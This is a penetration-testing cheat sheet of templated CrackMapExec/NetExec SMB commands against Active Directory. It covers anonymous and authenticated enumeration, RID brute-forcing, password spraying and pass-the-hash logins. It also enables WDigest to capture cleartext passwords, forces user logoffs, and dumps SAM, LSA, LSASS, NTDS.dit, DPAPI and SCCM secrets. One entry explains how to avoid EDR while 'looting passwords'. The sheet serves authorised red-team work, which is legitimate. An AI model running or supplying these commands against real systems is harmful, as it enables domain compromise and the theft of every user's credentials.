# cme (SMB)

% cme, crackmapexec, Active Directory, nxc, netexec, smb

## Enumerate hosts, network
#assessment/AD #attack_type/Enumeration #port/445 #protocol/smb #access/Domain_user
Example : cme smb 192.168.1.0/24

https://mpgn.gitbook.io/crackmapexec/

```bash
cme smb <ip>
```

## Enumerate domain users anonymously
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Anonymous

Enumerate domain users through a null session.

```bash
cme smb <dc-ip> -u '' -p '' --users
```

## Enumerate domain users
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 

Enumerate domain users.

```bash
cme smb <dc-ip> -u <user> -p <password> --users
```

## Enumerate domain computers
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user

Enumerate domain computers.

```bash
cme smb <dc-ip> -u <user> -p <password> --computers
```

## Enumerate SMB reachable domain computers
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Anonymous

Enumerate domain computers that can be reached via SMB.

```bash
cme smb computers.list
```

## Enumerate password policy
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user

Enumerate the domain password policy.

```bash
cme smb <dc-ip> -u <user> -p <password> --pass-pol
```

## Enumerate null session
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Anonymous

Check if the target accepts authentication via a null session.

```bash
cme smb <ip> -u '' -p ''
```

## Enumerate guest logon
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Anonymous

Check if the target accepts authentication via a Guest session.

```bash
cme smb <ip> -u 'a' -p ''
```

## Enumerate active sessions
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 

```bash
cme smb <ip> -u <user> -p <password> --sessions
```

## Enumerate users by bruteforce the RID
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 

```bash
cme smb <ip> -u <user> -p <password> --rid-brute
```

## Enumerate local groups
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 

```bash
cme smb <ip> -u <user> -p <password> --local-groups
```

## Enumerate shares
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 

Enumerate permissions on all shares

```bash
cme smb <ip> -u <user> -p <password> -d <domain> --shares
```

## Enumerate disks
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 

Enumerate disks on the remote target

```bash
cme smb <ip> -u <user> -p <password> --disks
```

## Enumerate smb target not signed
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user

Maps the network of live hosts and saves a list of only the hosts that  don't require SMB signing. List format is one IP per line.

```bash
cme smb <ip> --gen-relay-list smb_not_signed.list
```

## Enumerate logged users
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 

```bash
cme smb <ip> -u <user> -p <password> --loggedon-users
```

## Enumerate logged users
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 

```bash
cme smb <ip> -u <user> -p <password> -M enum_av
```

## Enumerate network interfaces
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Admin

Enumerate network interfaces on a host.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> --interfaces
```

## Local-auth
#assessment/AD #attack_type/Authentication #port/445 #port/139 #protocol/smb #access/Domain_user

Authenticate via a local account on the target.

```bash
cme smb <ip> -u <user> -p <password> --local-auth
```

## Local-auth with hash
#assessment/AD #attack_type/Authentication #port/445 #port/139 #protocol/smb #access/Domain_user

```bash
cme smb <ip> -u <user> -H <hash> --local-auth
```

## Domain auth
#assessment/AD #attack_type/Authentication #port/445 #port/139 #protocol/smb #access/Domain_user

```bash
cme smb <ip> -u <user> -p <password> -d <domain>
```

## Kerberos auth
#assessment/AD #attack_type/Authentication #port/445 #port/139 #protocol/smb #access/Domain_user

Previously import ticket : 
export KRB5CCNAME=/tmp/ticket.ccache

```bash
cme smb <ip> --kerberos
```

## Enable wdigest
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Domain_user

Enable/disable the WDigest provider and dump clear-text credentials from LSA memory.

```bash
cme smb <ip> -u <user|Administrator> -p <password> --local-auth --wdigest enable
```

## Loggout user
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #warning/modify_target #access/Domain_user

Can be useful after enable wdigest to force user to reconnect.

```bash
cme smb <ip> -u <user> -p <password> -x 'quser'
cme smb <ip> -u <user> -p <password> -x 'logoff <id_user>' --no-output
```

## Dump SAM
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump SAM hashes using methods from secretsdump.py

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> --sam
```

## Dump LSA
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump LSA secrets.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> --lsa
```

## Dump LSA (old method)
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump LSA secrets using methods from secretsdump.py

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> --lsa secdump
```

## Dump LSASS
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump secrets from the LSASS process memory using methods from LSASSY.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M lsassy
```

## Dump LSASS - with bloodhound update
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

```bash
cme smb <ip> --local-auth -u <user> -H <hash> -M lsassy -o BLOODHOUND=True NEO4JUSER=<user|neo4j> NEO4JPASS=<neo4jpass|exegol4thewin>
```

## Dump NTDS
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Domain_Admin

Dump the NTDS.dit from target DC using methods from secretsdump.py

⚠️ Requirement : Domain Admin ou Local admin privileges on the Domain Controller

```bash
cme smb <dc-ip> -u <user> -p <password> --ntds
```

## Dump DPAPI
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump the DPAPI credentials from target host. Retrieves all secrets from Credential Manager, Chrome, Edge, Firefox.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <dc-ip> -u <user> -p <password> --dpapi
```

## Dump DPAPI NoSystem (avoid EDR trigger)
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump the DPAPI credentials from target host. Retrieves all secrets from Credential Manager, Chrome, Edge, Firefox.
Won't collect system credentials. This will prevent EDR from stopping you from looting passwords.
<br>
⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <dc-ip> -u <user> -p <password> --dpapi nosystem
```

## Dump SCCM
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump the SCCM from the target host using methods from dploot

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <dc-ip> -u <user> -p <password> --sccm
```

## Password spray (user=password)
#assessment/AD #attack_type/Bruteforce #port/445 #port/139 #protocol/smb #access/Anonymous

```bash
cme smb <dc-ip> -u <users.list> -p <users.list> --no-bruteforce --continue-on-success
```

## Password spray multiple test 
#assessment/AD #attack_type/Bruteforce #port/445 #protocol/smb #access/Anonymous

(careful on lockout)

```bash
cme smb <dc-ip> -u <users.list> -p <password.txt> --continue-on-success
```

## Put file
#assessment/AD #attack_type/Other #port/445 #protocol/smb #access/Domain_user

Send a local file to the remote target.

```bash
cme smb <ip> -u <user> -p <password> --put-file <local_file> <remote_path|\\Windows\\Temp\\target.txt>
```

## Get file
#assessment/AD #attack_type/Other #port/445 #protocol/smb #access/Domain_user
Send a local file to the remote target

```bash
cme smb <ip> -u <user> -p <password> --get-file <remote_path|\\Windows\\Temp\\target.txt> <local_file>
```

= ip: 192.168.1.0/24
= dc-ip: $DC_IP
= user: $USER
= password: $PASSWORD
= domain: $DOMAIN
